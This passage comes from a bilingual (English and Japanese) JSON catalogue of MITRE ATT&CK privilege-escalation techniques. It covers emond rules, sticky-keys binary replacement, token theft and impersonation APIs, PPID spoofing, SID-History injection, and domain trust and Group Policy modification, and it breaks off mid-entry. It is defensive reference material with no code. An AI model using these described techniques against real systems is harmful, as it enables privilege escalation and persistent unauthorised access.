                        "description_jp": "攻撃者は、Event Monitor Daemon (emond)によってトリガーされた悪意のあるコンテンツを実行することで、永続性を獲得し、特権を昇格させる可能性がある。emondは[起動デーモン](https://attack.mitre.org/techniques/T1543/004)であり、様々なサービスからイベントを受け取り、シンプルなルールエンジンを通して実行し、アクションを起こします。<code>/sbin/emond</code> にある emond バイナリは、<code>/etc/emond.d/rules/</code> ディレクトリから任意のルールをロードし、明示的に定義されたイベントが発生するとアクションを実行します。\n\nルールファイルは plist 形式で、名前、イベントタイプ、実行するアクションを定義します。イベントタイプの例としては、システムの起動やユーザー認証などがあります。アクションの例としては、システムコマンドの実行や電子メールの送信などがあります。<code>/System/Library/LaunchDaemons/com.apple.emond.plist</code>にある[起動デーモン](https://attack.mitre.org/techniques/T1543/004)設定ファイルで指定されたQueueDirectoriesパス<code>/private/var/db/emondClients</code>にファイルが存在しない場合、emondサービスは起動しません。(引用: xorrior emond 2018年1月)(引用: magnusviri emond 2016年4月)(引用: sentinelone macos persist 2019年6月)\n\nシステム起動やユーザー認証など、定義されたイベントが発生したときにコマンドを実行するルールを記述することで、このサービスを悪用する可能性がある(引用: xorrior emond 2018年1月)(引用: magnusviri emond 2016年4月)(引用: sentinelone macos persist 2019年6月) また、emondサービスは[起動デーモン](https://attack.mitre.org/techniques/T1543/004) サービスによってroot権限で実行されるため、悪用者は管理者からrootに権限を昇格させることができる可能性がある。"
                    },
                    {
                        "id": "T1546.008",
                        "name_eng": "Accessibility Features",
                        "name_jp": "アクセシビリティ機能",
                        "description_eng": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by accessibility features. Windows contains accessibility features that may be launched with a key combination before a user has logged in (ex: when the user is on the Windows logon screen). An adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system.\n\nTwo common accessibility programs are <code>C:\\Windows\\System32\\sethc.exe</code>, launched when the shift key is pressed five times and <code>C:\\Windows\\System32\\utilman.exe</code>, launched when the Windows + U key combination is pressed. The sethc.exe program is often referred to as \"sticky keys\", and has been used by adversaries for unauthenticated access through a remote desktop login screen. (Citation: FireEye Hikit Rootkit)\n\nDepending on the version of Windows, an adversary may take advantage of these features in different ways. Common methods used by adversaries include replacing accessibility feature binaries or pointers/references to these binaries in the Registry. In newer versions of Windows, the replaced binary needs to be digitally signed for x64 systems, the binary must reside in <code>%systemdir%\\</code>, and it must be protected by Windows File or Resource Protection (WFP/WRP). (Citation: DEFCON2016 Sticky Keys) The [Image File Execution Options Injection](https://attack.mitre.org/techniques/T1546/012) debugger method was likely discovered as a potential workaround because it does not require the corresponding accessibility feature binary to be replaced.\n\nFor simple binary replacement on Windows XP and later as well as and Windows Server 2003/R2 and later, for example, the program (e.g., <code>C:\\Windows\\System32\\utilman.exe</code>) may be replaced with \"cmd.exe\" (or another program that provides backdoor access). Subsequently, pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) will cause the replaced file to be executed with SYSTEM privileges. (Citation: Tilbury 2014)\n\nOther accessibility features exist that may also be leveraged in a similar fashion: (Citation: DEFCON2016 Sticky Keys)(Citation: Narrator Accessibility Abuse)\n\n* On-Screen Keyboard: <code>C:\\Windows\\System32\\osk.exe</code>\n* Magnifier: <code>C:\\Windows\\System32\\Magnify.exe</code>\n* Narrator: <code>C:\\Windows\\System32\\Narrator.exe</code>\n* Display Switcher: <code>C:\\Windows\\System32\\DisplaySwitch.exe</code>\n* App Switcher: <code>C:\\Windows\\System32\\AtBroker.exe</code>",
                        "description_jp": "攻撃者は、アクセシビリティ機能をトリガーとして悪意のあるコンテンツを実行することで、永続性を確立したり、特権を昇格させたりする可能性がある。Windowsには、ユーザがログインする前（例：ユーザがWindowsのログオン画面にいるとき）に、キーの組み合わせで起動できるアクセシビリティ機能があります。敵は、これらのプログラムの起動方法を変更することで、システムにログインせずにコマンドプロンプトやバックドアを取得することができます。\n\n一般的なアクセシビリティプログラムは、シフトキーを5回押したときに起動する<code>C:\\Windows\\System32\\sethc.exe</code>と、Windows + Uキーの組み合わせを押したときに起動する<code>C:\\Windows\\System32\\utilman.exe</code>の2つです。sethc.exeプログラムは、しばしば「スティッキーキー」と呼ばれ、敵対者によってリモートデスクトップのログイン画面を介して認証されていないアクセスに使用されている。(引用：FireEye Hikit Rootkit)\n\nWindowsのバージョンによって、敵対者はさまざまな方法でこれらの機能を利用する可能性がある。敵対者が使用する一般的な方法には、レジストリ内のアクセシビリティ機能のバイナリ、またはこれらのバイナリへのポインタ/参照を置き換えることが含まれます。Windows の新しいバージョンでは、置き換えられたバイナリは x64 システム用にデジタル署名されている必要があり、バイナリは <code>%systemdir%\\</code> に存在する必要があり、Windows File or Resource Protection (WFP/WRP) によって保護されている必要があります。(引用: DEFCON2016 Sticky Keys) [イメージファイル実行オプションインジェクション](https://attack.mitre.org/techniques/T1546/012)デバッガー手法は、対応するアクセシビリティ機能バイナリを置き換える必要がないため、潜在的な回避策として発見された可能性が高い。\n\nWindows XP以降やWindows Server 2003/R2以降での単純なバイナリの置き換えでは、例えば、プログラム（例えば、<code>C:\\Windows\\System32\\utilman.exe</code>）を「cmd.exe」（またはバックドアアクセスを提供する他のプログラム）に置き換えることができる。その後、キーボードの前に座った状態でログイン画面で適切なキーの組み合わせを押すか、[リモートデスクトッププロトコル](https://attack.mitre.org/techniques/T1021/001)で接続すると、置き換えられたファイルがSYSTEM権限で実行されます。(引用：Tilbury 2014）\n\n同様の方法で活用される可能性のある他のアクセシビリティ機能も存在する：(引用：DEFCON2016 Sticky Keys)(引用：Narrator Accessibility Abuse)\n\n* オンスクリーンキーボード：<code>C:\\Windows\\System32\\osk.exe</code>\n* 拡大鏡：<code>C:\\Windows\\System32\\Magnify.exe</code>\n* ナレーター：<code>C:\\Windows\\System32\\Narrator.exe</code>\n* ディスプレイスイッチャー：<code>C:\\Windows\\System32\\DisplaySwitch.exe</code>\n* App Switcher：<code>C:\\Windows\\System32\\AtBroker.exe</code>"
                    }
                ]
            },
            {
                "id": "T1134",
                "name_eng": "Access Token Manipulation",
                "name_jp": "アクセストークン操作",
                "description_eng": "Adversaries may modify access tokens to operate under a different user or system security context to perform actions and bypass access controls. Windows uses access tokens to determine the ownership of a running process. A user can manipulate access tokens to make a running process appear as though it is the child of a different process or belongs to someone other than the user that started the process. When this occurs, the process also takes on the security context associated with the new token.\n\nAn adversary can use built-in Windows API functions to copy access tokens from existing processes; this is known as token stealing. These token can then be applied to an existing process (i.e. [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001)) or used to spawn a new process (i.e. [Create Process with Token](https://attack.mitre.org/techniques/T1134/002)). An adversary must already be in a privileged user context (i.e. administrator) to steal a token. However, adversaries commonly use token stealing to elevate their security context from the administrator level to the SYSTEM level. An adversary can then use a token to authenticate to a remote system as the account for that token if the account has appropriate permissions on the remote system.(Citation: Pentestlab Token Manipulation)\n\nAny standard user can use the <code>runas</code> command, and the Windows API functions, to create impersonation tokens; it does not require access to an administrator account. There are also other mechanisms, such as Active Directory fields, that can be used to modify access tokens.",
                "description_jp": "攻撃者は、アクションを実行しアクセス制御をバイパスするために、異なるユーザーまたはシステムのセキュリティコンテキストで動作するようにアクセストークンを変更する可能性があります。Windowsはアクセストークンを使用して、実行中のプロセスの所有権を決定します。ユーザーはアクセストークンを操作して、実行中のプロセスを別のプロセスのサブプロセスであるかのように見せかけたり、プロセスを開始したユーザー以外の誰かに属しているかのように見せかけたりすることができます。これが発生すると、プロセスは新しいトークンに関連付けられたセキュリティコンテキストも引き継ぎます。\n\n攻撃者は、組み込みのWindows API関数を使用して既存のプロセスからアクセストークンをコピーできます。これはトークン窃取として知られています。これらのトークンは、既存のプロセスに適用したり（つまり、[トークン偽装/窃取](https://attack.mitre.org/techniques/T1134/001)）、新しいプロセスを生成するために使用したり（つまり、[トークンを使用したプロセスの作成](https://attack.mitre.org/techniques/T1134/002)）できます。攻撃者は、トークンを盗むためには既に特権ユーザーコンテキスト（つまり管理者）である必要があります。ただし、攻撃者は一般的に、管理者レベルからSYSTEMレベルにセキュリティコンテキストを昇格させるためにトークン窃取を使用します。アカウントがリモートシステム上で適切な権限を持っている場合、攻撃者はトークンを使用してそのトークンのアカウントとしてリモートシステムに認証できます。(引用: Pentestlab Token Manipulation)\n\n標準ユーザーは誰でも、<code>runas</code>コマンドおよびWindows API関数を使用して偽装トークンを作成できます。管理者アカウントへのアクセスは必要ありません。Active Directoryフィールドなど、アクセストークンを変更するために使用できる他のメカニズムもあります。",
                "subtechniques": [
                    {
                        "id": "T1134.001",
                        "name_eng": "Token Impersonation/Theft",
                        "name_jp": "トークン偽装/窃取",
                        "description_eng": "Adversaries may duplicate then impersonate another user's existing token to escalate privileges and bypass access controls. For example, an adversary can duplicate an existing token using `DuplicateToken` or `DuplicateTokenEx`.(Citation: DuplicateToken function) The token can then be used with `ImpersonateLoggedOnUser` to allow the calling thread to impersonate a logged on user's security context, or with `SetThreadToken` to assign the impersonated token to a thread.\n\nAn adversary may perform [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001) when they have a specific, existing process they want to assign the duplicated token to. For example, this may be useful for when the target user has a non-network logon session on the system.\n\nWhen an adversary would instead use a duplicated token to create a new process rather than attaching to an existing process, they can additionally [Create Process with Token](https://attack.mitre.org/techniques/T1134/002) using `CreateProcessWithTokenW` or `CreateProcessAsUserW`. [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001) is also distinct from [Make and Impersonate Token](https://attack.mitre.org/techniques/T1134/003) in that it refers to duplicating an existing token, rather than creating a new one.",
                        "description_jp": "攻撃者は、権限を昇格させアクセス制御をバイパスするために、別のユーザーの既存のトークンを複製して偽装する可能性があります。例えば、攻撃者は`DuplicateToken`または`DuplicateTokenEx`を使用して既存のトークンを複製できます。(引用: DuplicateToken function) その後、トークンは`ImpersonateLoggedOnUser`と共に使用して呼び出しスレッドがログオンユーザーのセキュリティコンテキストを偽装できるようにするか、`SetThreadToken`と共に使用して偽装トークンをスレッドに割り当てることができます。\n\n攻撃者は、複製したトークンを割り当てたい特定の既存のプロセスがある場合に、[トークン偽装/窃取](https://attack.mitre.org/techniques/T1134/001)を実行する可能性があります。例えば、これはターゲットユーザーがシステム上で非ネットワークログオンセッションを持っている場合に役立つ可能性があります。\n\n攻撃者が既存のプロセスにアタッチするのではなく、複製したトークンを使用して新しいプロセスを作成する場合は、追加で`CreateProcessWithTokenW`または`CreateProcessAsUserW`を使用して[トークンを使用したプロセスの作成](https://attack.mitre.org/techniques/T1134/002)を行うことができます。[トークン偽装/窃取](https://attack.mitre.org/techniques/T1134/001)は、新しいトークンを作成するのではなく、既存のトークンを複製することを指すため、[トークンの作成と偽装](https://attack.mitre.org/techniques/T1134/003)とも区別されます。"
                    },
                    {
                        "id": "T1134.004",
                        "name_eng": "Parent PID Spoofing",
                        "name_jp": "親PIDスプーフィング",
                        "description_eng": "Adversaries may spoof the parent process identifier (PPID) of a new process to evade process-monitoring defenses or to elevate privileges. New processes are typically spawned directly from their parent, or calling, process unless explicitly specified. One way of explicitly assigning the PPID of a new process is via the <code>CreateProcess</code> API call, which supports a parameter that defines the PPID to use.(Citation: DidierStevens SelectMyParent Nov 2009) This functionality is used by Windows features such as User Account Control (UAC) to correctly set the PPID after a requested elevated process is spawned by SYSTEM (typically via <code>svchost.exe</code> or <code>consent.exe</code>) rather than the current user context.(Citation: Microsoft UAC Nov 2018)\n\nAdversaries may abuse these mechanisms to evade defenses, such as those blocking processes spawning directly from Office documents, and analysis targeting unusual/potentially malicious parent-child process relationships, such as spoofing the PPID of [PowerShell](https://attack.mitre.org/techniques/T1059/001)/[Rundll32](https://attack.mitre.org/techniques/T1218/011) to be <code>explorer.exe</code> rather than an Office document delivered as part of [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001).(Citation: CounterCept PPID Spoofing Dec 2018) This spoofing could be executed via [Visual Basic](https://attack.mitre.org/techniques/T1059/005) within a malicious Office document or any code that can perform [Native API](https://attack.mitre.org/techniques/T1106).(Citation: CTD PPID Spoofing Macro Mar 2019)(Citation: CounterCept PPID Spoofing Dec 2018)\n\nExplicitly assigning the PPID may also enable elevated privileges given appropriate access rights to the parent process. For example, an adversary in a privileged user context (i.e. administrator) may spawn a new process and assign the parent as a process running as SYSTEM (such as <code>lsass.exe</code>), causing the new process to be elevated via the inherited access token.(Citation: XPNSec PPID Nov 2017)",
                        "description_jp": "攻撃者は、プロセス監視防御を回避したり権限を昇格させたりするために、新しいプロセスの親プロセス識別子（PPID）を偽装する可能性があります。新しいプロセスは、明示的に指定されない限り、通常、その親プロセスまたは呼び出し元プロセスから直接生成されます。新しいプロセスのPPIDを明示的に割り当てる1つの方法は、使用するPPIDを定義するパラメータをサポートする<code>CreateProcess</code> API呼び出しを介することです。(引用: DidierStevens SelectMyParent Nov 2009) この機能は、要求された昇格プロセスが現在のユーザーコンテキストではなくSYSTEM（通常は<code>svchost.exe</code>または<code>consent.exe</code>を介して）によって生成された後、PPIDを正しく設定するために、ユーザーアカウント制御（UAC）などのWindows機能によって使用されます。(引用: Microsoft UAC Nov 2018)\n\n攻撃者はこれらのメカニズムを悪用して、Officeドキュメントから直接生成されるプロセスをブロックするものなどの防御を回避したり、[スピアフィッシング添付ファイル](https://attack.mitre.org/techniques/T1566/001)の一部として配信されたOfficeドキュメントではなく<code>explorer.exe</code>であるかのように[PowerShell](https://attack.mitre.org/techniques/T1059/001)/[Rundll32](https://attack.mitre.org/techniques/T1218/011)のPPIDを偽装するなど、異常な/潜在的に悪意のある親子プロセス関係をターゲットとする分析を回避したりする可能性があります。(引用: CounterCept PPID Spoofing Dec 2018) この偽装は、悪意のあるOfficeドキュメント内の[Visual Basic](https://attack.mitre.org/techniques/T1059/005)または[ネイティブAPI](https://attack.mitre.org/techniques/T1106)を実行できる任意のコードを介して実行される可能性があります。(引用: CTD PPID Spoofing Macro Mar 2019)(引用: CounterCept PPID Spoofing Dec 2018)\n\nPPIDを明示的に割り当てることは、親プロセスへの適切なアクセス権があれば、昇格された権限を有効にすることもできます。例えば、特権ユーザーコンテキスト（つまり管理者）の攻撃者は、新しいプロセスを生成し、親をSYSTEMとして実行されているプロセス（<code>lsass.exe</code>など）として割り当てることで、継承されたアクセストークンを介して新しいプロセスを昇格させることができます。(引用: XPNSec PPID Nov 2017)"
                    },
                    {
                        "id": "T1134.005",
                        "name_eng": "SID-History Injection",
                        "name_jp": "SID履歴インジェクション",
                        "description_eng": "Adversaries may use SID-History Injection to escalate privileges and bypass access controls. The Windows security identifier (SID) is a unique value that identifies a user or group account. SIDs are used by Windows security in both security descriptors and access tokens. (Citation: Microsoft SID) An account can hold additional SIDs in the SID-History Active Directory attribute (Citation: Microsoft SID-History Attribute), allowing inter-operable account migration between domains (e.g., all values in SID-History are included in access tokens).\n\nWith Domain Administrator (or equivalent) rights, harvested or well-known SID values (Citation: Microsoft Well Known SIDs Jun 2017) may be inserted into SID-History to enable impersonation of arbitrary users/groups such as Enterprise Administrators. This manipulation may result in elevated access to local resources and/or access to otherwise inaccessible domains via lateral movement techniques such as [Remote Services](https://attack.mitre.org/techniques/T1021), [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002), or [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006).",
                        "description_jp": "攻撃者はSID履歴インジェクションを使用して権限を昇格させ、アクセス制御をバイパスする可能性があります。Windowsセキュリティ識別子（SID）は、ユーザーまたはグループアカウントを識別する一意の値です。SIDは、セキュリティ記述子とアクセストークンの両方でWindowsセキュリティによって使用されます。(引用: Microsoft SID) アカウントは、SID履歴Active Directory属性に追加のSIDを保持でき(引用: Microsoft SID-History Attribute)、ドメイン間の相互運用可能なアカウント移行を可能にします（例：SID履歴のすべての値がアクセストークンに含まれます）。\n\nドメイン管理者（または同等の）権限があれば、収集されたまたはよく知られているSID値（引用: Microsoft Well Known SIDs Jun 2017）をSID履歴に挿入して、エンタープライズ管理者などの任意のユーザー/グループの偽装を有効にすることができます。この操作により、ローカルリソースへの昇格されたアクセスや、[リモートサービス](https://attack.mitre.org/techniques/T1021)、[SMB/Windows管理共有](https://attack.mitre.org/techniques/T1021/002)、または[Windowsリモート管理](https://attack.mitre.org/techniques/T1021/006)などの横方向の移動テクニックを介した、それ以外ではアクセスできないドメインへのアクセスが可能になる場合があります。"
                    },
                    {
                        "id": "T1134.002",
                        "name_eng": "Create Process with Token",
                        "name_jp": "トークンを使用したプロセスの作成",
                        "description_eng": "Adversaries may create a new process with an existing token to escalate privileges and bypass access controls. Processes can be created with the token and resulting security context of another user using features such as <code>CreateProcessWithTokenW</code> and <code>runas</code>.(Citation: Microsoft RunAs)\n\nCreating processes with a token not associated with the current user may require the credentials of the target user, specific privileges to impersonate that user, or access to the token to be used. For example, the token could be duplicated via [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001) or created via [Make and Impersonate Token](https://attack.mitre.org/techniques/T1134/003) before being used to create a process.\n\nWhile this technique is distinct from [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001), the techniques can be used in conjunction where a token is duplicated and then used to create a new process.",
                        "description_jp": "攻撃者は、既存のトークンを使用して新しいプロセスを作成し、権限を昇格させアクセス制御をバイパスする可能性があります。プロセスは、<code>CreateProcessWithTokenW</code>や<code>runas</code>などの機能を使用して、別のユーザーのトークンと結果のセキュリティコンテキストで作成できます。(引用: Microsoft RunAs)\n\n現在のユーザーに関連付けられていないトークンを使用してプロセスを作成するには、ターゲットユーザーの資格情報、そのユーザーを偽装するための特定の権限、または使用するトークンへのアクセスが必要になる場合があります。例えば、トークンは[トークン偽装/窃取](https://attack.mitre.org/techniques/T1134/001)によって複製されたり、[トークンの作成と偽装](https://attack.mitre.org/techniques/T1134/003)によって作成されたりしてから、プロセスを作成するために使用されることがあります。\n\nこのテクニックは[トークン偽装/窃取](https://attack.mitre.org/techniques/T1134/001)とは異なりますが、トークンが複製されてから新しいプロセスの作成に使用される場合には、これらのテクニックを組み合わせて使用できます。"
                    },
                    {
                        "id": "T1134.003",
                        "name_eng": "Make and Impersonate Token",
                        "name_jp": "トークンの作成と偽装",
                        "description_eng": "Adversaries may make new tokens and impersonate users to escalate privileges and bypass access controls. For example, if an adversary has a username and password but the user is not logged onto the system the adversary can then create a logon session for the user using the `LogonUser` function.(Citation: LogonUserW function) The function will return a copy of the new session's access token and the adversary can use `SetThreadToken` to assign the token to a thread.\n\nThis behavior is distinct from [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001) in that this refers to creating a new user token instead of stealing or duplicating an existing one.",
                        "description_jp": "攻撃者は新しいトークンを作成し、ユーザーを偽装して権限を昇格させ、アクセス制御をバイパスする可能性があります。例えば、攻撃者がユーザー名とパスワードを持っているが、ユーザーがシステムにログオンしていない場合、攻撃者は`LogonUser`関数を使用してユーザーのログオンセッションを作成できます。(引用: LogonUserW function) この関数は新しいセッションのアクセストークンのコピーを返し、攻撃者は`SetThreadToken`を使用してトークンをスレッドに割り当てることができます。\n\nこの動作は、既存のトークンを盗んだり複製したりするのではなく、新しいユーザートークンを作成することを指すため、[トークン偽装/窃取](https://attack.mitre.org/techniques/T1134/001)とは異なります。"
                    }
                ]
            },
            {
                "id": "T1484",
                "name_eng": "Domain or Tenant Policy Modification",
                "name_jp": "ドメインまたはテナントポリシーの変更",
                "description_eng": "Adversaries may modify the configuration settings of a domain or identity tenant to evade defenses and/or escalate privileges in centrally managed environments. Such services provide a centralized means of managing identity resources such as devices and accounts, and often include configuration settings that may apply between domains or tenants such as trust relationships, identity syncing, or identity federation.\n\nModifications to domain or tenant settings may include altering domain Group Policy Objects (GPOs) in Microsoft Active Directory (AD) or changing trust settings for domains, including federation trusts relationships between domains or tenants.\n\nWith sufficient permissions, adversaries can modify domain or tenant policy settings. Since configuration settings for these services apply to a large number of identity resources, there are a great number of potential attacks malicious outcomes that can stem from this abuse. Examples of such abuse include:  \n\n* modifying GPOs to push a malicious [Scheduled Task](https://attack.mitre.org/techniques/T1053/005) to computers throughout the domain environment(Citation: ADSecurity GPO Persistence 2016)(Citation: Wald0 Guide to GPOs)(Citation: Harmj0y Abusing GPO Permissions)\n* modifying domain trusts to include an adversary-controlled domain, allowing adversaries to  forge access tokens that will subsequently be accepted by victim domain resources(Citation: Microsoft - Customer Guidance on Recent Nation-State Cyber Attacks)\n* changing configuration settings within the AD environment to implement a [Rogue Domain Controller](https://attack.mitre.org/techniques/T1207).\n* adding new, adversary-controlled federated identity providers to identity tenants, allowing adversaries to authenticate as any user managed by the victim tenant (Citation: Okta Cross-Tenant Impersonation 2023)\n\nAdversaries may temporarily modify domain or tenant policy, carry out a malicious action(s), and then revert the change to remove suspicious indicators.",
                "description_jp": "攻撃者は、ドメインまたはIDテナントの構成設定を変更して、一元管理された環境で防御を回避したり権限を昇格させたりする可能性があります。このようなサービスは、デバイスやアカウントなどのIDリソースを管理するための一元的な手段を提供し、多くの場合、信頼関係、ID同期、IDフェデレーションなど、ドメイン間またはテナント間に適用される可能性のある構成設定を含みます。\n\nドメインまたはテナント設定の変更には、Microsoft Active Directory (AD)のドメイングループポリシーオブジェクト(GPO)の変更や、ドメインまたはテナント間のフェデレーショントラスト関係を含むドメインのトラスト設定の変更が含まれる場合があります。\n\n十分な権限があれば、攻撃者はドメインまたはテナントポリシー設定を変更できます。これらのサービスの構成設定は多数のIDリソースに適用されるため、この悪用から生じる可能性のある潜在的な攻撃の悪意のある結果は多数あります。このような悪用の例としては、次のようなものがあります：\n\n* ドメイン環境全体のコンピュータに悪意のある[スケジュールタスク](https://attack.mitre.org/techniques/T1053/005)をプッシュするためのGPOの変更(引用: ADSecurity GPO Persistence 2016)(引用: Wald0 Guide to GPOs)(引用: Harmj0y Abusing GPO Permissions)\n* 攻撃者が制御するドメインを含めるためのドメイン信頼関係の変更。これにより、攻撃者は被害者ドメインリソースによって後で受け入れられるアクセストークンを偽造できるようになります(引用: Microsoft - Customer Guidance on Recent Nation-State Cyber Attacks)\n* [不正なドメインコントローラー](https://attack.mitre.org/techniques/T1207)を実装するためのAD環境内の構成設定の変更。\n* 新しい、攻撃者が制御するフェデレーションIDプロバイダーをIDテナントに追加し、攻撃者が被害者テナントによって管理されている任意のユーザーとして認証できるようにします。(引用: Okta Cross-Tenant Impersonation 2023)\n\n攻撃者は、ドメインまたはテナントポリシーを一時的に変更し、悪意のあるアクションを実行した後、変更を元に戻して疑わしいインジケータを削除する可能性があります。",
                "subtechniques": [
                    {
                        "id": "T1484.002",
                        "name_eng": "Trust Modification",
                        "name_jp": "信頼関係の変更",
                        "description_eng": "Adversaries may add new domain trusts, modify the properties of existing domain trusts, or otherwise change the configuration of trust relationships between domains and tenants to evade defenses and/or elevate privileges.Trust details, such as whether or not user identities are federated, allow authentication and authorization properties to apply between domains or tenants for the purpose of accessing shared resources.(Citation: Microsoft - Azure AD Federation) These trust objects may include accounts, credentials, and other authentication material applied to servers, tokens, and domains.\n\nManipulating these trusts may allow an adversary to escalate privileges and/or evade defenses by modifying settings to add objects which they control. For example, in Microsoft Active Directory (AD) environments, this may be used to forge [SAML Tokens](https://attack.mitre.org/techniques/T1606/002) without the need to compromise the signing certificate to forge new credentials. Instead, an adversary can manipulate domain trusts to add their own signing certificate. An adversary may also convert an AD domain to a federated domain using Active Directory Federation Services (AD FS), which may enable malicious trust modifications such as altering the claim issuance rules to log in any valid set of credentials as a specified user.(Citation: AADInternals zure AD Federated Domain) \n\nAn adversary may also add a new federated identity provider to an identity tenant such as Okta or AWS IAM Identity Center, which may enable the adversary to authenticate as any user of the tenant.(Citation: Okta Cross-Tenant Impersonation 2023) This may enable the threat actor to gain broad access into a variety of cloud-based services that leverage the identity tenant. For example, in AWS environments, an adversary that creates a new identity provider for an AWS Organization will be able to federate into all of the AWS Organization member accounts without creating identities for each of the member accounts.(Citation: AWS RE:Inforce Threat Detection 2024)",
                        "description_jp": "攻撃者は、新しいドメイン信頼を追加したり、既存のドメイン信頼のプロパティを変更したり、あるいはドメインとテナント間の信頼関係の構成をその他の方法で変更して、防御を回避したり権限を昇格させたりする可能性があります。ユーザーIDがフェデレーションされているかどうかなどの信頼の詳細は、共有リソースへのアクセスの目的でドメイン間またはテナント間に認証および承認プロパティを適用できるようにします。(引用: Microsoft - Azure AD Federation) これらの信頼オブジェクトには、アカウント、資格情報、およびサーバー、トークン、ドメインに適用されるその他の認証マテリアルが含まれる場合があります。\n\nこれらの信頼関係を操作することにより、攻撃者は、制御するオブジェクトを追加するように設定を変更することで、権限を昇格させたり防御を回避したりできる可能性があります。例えば、Microsoft Active Directory (AD) 環境では、署名証明書を侵害して新しい資格情報を偽造する必要なく、[SAMLトークン](https://attack.mitre.org/techniques/T1606/002)を偽造するためにこれを使用できます。代わりに、攻撃者はドメイン信頼関係を操作して独自の署名証明書を追加できます。攻撃者はまた、Active Directory Federation Services (AD FS) を使用してADドメインをフェデレーションドメインに変換することもでき、これにより、指定されたユーザーとして任意の有効な資格情報セットでログインするためのクレーム発行規則の変更など、悪意のある信頼関係の変更が可能になる場合があります。(引用: AADInternals zure AD Federated Domain)\n\n攻撃者はまた、OktaやAWS IAM Identity CenterなどのIDテナントに新しいフェデレーションIDプロバイダーを追加する可能性があり、これにより攻撃者はテナントの任意のユーザーとして認証できるようになる可能性があります。(引用: Okta Cross-Tenant Impersonation 2023) これにより、脅威アクターはIDテナントを利用するさまざまなクラウドベースのサービスへの広範なアクセスを取得できる可能性があります。例えば、AWS環境では、AWS組織の新しいIDプロバイダーを作成する攻撃者は、各メンバーアカウントのIDを作成することなく、すべてのAWS組織メンバーアカウントにフェデレーションできるようになります。(引用: AWS RE:Inforce Threat Detection 2024)"
                    },
                    {
                        "id": "T1484.001",
                        "name_eng": "Group Policy Modification",
                        "name_jp": "グループポリシーの変更",
                        "description_eng": "Adversaries may modify Group Policy Objects (GPOs) to subvert the intended discretionary access controls for a domain, usually with the intention of escalating privileges on the domain. Group policy allows for centralized management of user and computer settings in Active Directory (AD). GPOs are containers for group policy settings made up of files stored within a predictable network path `\\<DOMAIN>\\SYSVOL\\<DOMAIN>\\Policies\\`.(Citation: TechNet Group Policy Basics)(Citation: ADSecurity GPO Persistence 2016) \n\nLike other objects in AD, GPOs have access controls associated with them. By default all user accounts in the domain have permission to read GPOs. It is possible to delegate GPO access control permissions, e.g. write access, to specific users or groups in the domain.\n\nMalicious GPO modifications can be used to implement many other malicious behaviors such as [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001), [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105), [Create Account](https://attack.mitre.org/techniques/T1136), [Service Execution](https://attack.mitre.org/techniques/T1569/002),  and more.(Citation: ADSecurity GPO Persistence 2016)(Citation: Wald0 Guide to GPOs)(Citation: Harmj0y Abusing GPO Permissions)(Citation: Mandiant M Trends 2016)(Citation: Microsoft Hacking Team Breach) Since GPOs can control so many user and machine settings in the AD environment, there are a great number of potential attacks that can stem from this GPO abuse.(Citation: Wald0 Guide to GPOs)\n\nFor example, publicly available scripts such as <code>New-GPOImmediateTask</code> can be leveraged to automate the creation of a malicious [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053) by modifying GPO settings, in this case modifying <code>&lt;GPO_PATH&gt;\\Machine\\Preferences\\ScheduledTasks\\ScheduledTasks.xml</code>.(Citation: Wald0 Guide to GPOs)(Citation: Harmj0y Abusing GPO Permissions) In some cases an adversary might modify specific user rights like SeEnableDelegationPrivilege, set in <code>&lt;GPO_PATH&gt;\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf</code>, to achieve a subtle AD backdoor with complete control of the domain because the user account under the adversary's control would then be able to modify GPOs.(Citation: Harmj0y SeEnableDelegationPrivilege Right)",
                        "description_jp": "攻撃者は、ドメインの意図した任意アクセス制御を破壊するためにグループポリシーオブジェクト（GPO）を変更する可能性があり、通常はドメイン上の権限を昇格させることを目的としています。グループポリシーは、Active Directory（AD）内のユーザーとコンピューターの設定を一元管理できるようにします。GPOは、予測可能なネットワークパス`\\<DOMAIN>\\SYSVOL\\<DOMAIN>\\Policies\\`内に保存されているファイルで構成されるグループポリシー設定のコンテナーです。(引用: TechNet Group Policy Basics)(引用: ADSecurity GPO Persistence 2016)\n\nAD内の他のオブジェクトと同様に、GPOにはアクセス制御が関連付けられています。デフォルトでは、ドメイン内のすべてのユーザーアカウントがGPOの読み取り権限を持っています。GPOアクセス制御権限（書き込みアクセスなど）をドメイン内の特定のユーザーまたはグループに委任することが可能です。\n\n悪意のあるGPOの変更は、[スケジュールされたタスク/ジョブ](https://attack.mitre.org/techniques/T1053)、[ツールの無効化または変更](https://attack.mitre.org/techniques/T1562/001)、[イングレスツール転送](https://attack.mitre.org/techniques/T1105)、[アカウントの作成](https://attack.mitre.org/techniques/T1136)、[サービス実行](https://attack.mitre.org/techniques/T1569/002)など、他の多くの悪意のある動作を実装するために使用できます。(引用: ADSecurity GPO Persistence 2016)(引用: Wald0 Guide to GPOs)(引用: Harmj0y Abusing GPO Permissions)(引用: Mandiant M Trends 2016)(引用: Microsoft Hacking Team Breach) GPOはAD環境内の非常に多くのユーザーとマシンの設定を制御できるため、このGPOの悪用から生じる可能性のある潜在的な攻撃は多数あります。(引用: Wald0 Guide to GPOs)\n\n例えば、`New-GPOImmediateTask`などの一般に入手可能なスクリプトを利用して、GPO設定を変更することにより、悪意のある[スケジュールされたタスク/ジョブ](https://attack.mitre.org/techniques/T1053)の作成を自動化できます。この場合、`&lt;GPO_PATH&gt;\\Machine\\Preferences\\ScheduledTasks\\ScheduledTasks.xml`を変更します。(引用: Wald0 Guide to GPOs)(引用: Harmj0y Abusing GPO Permissions) 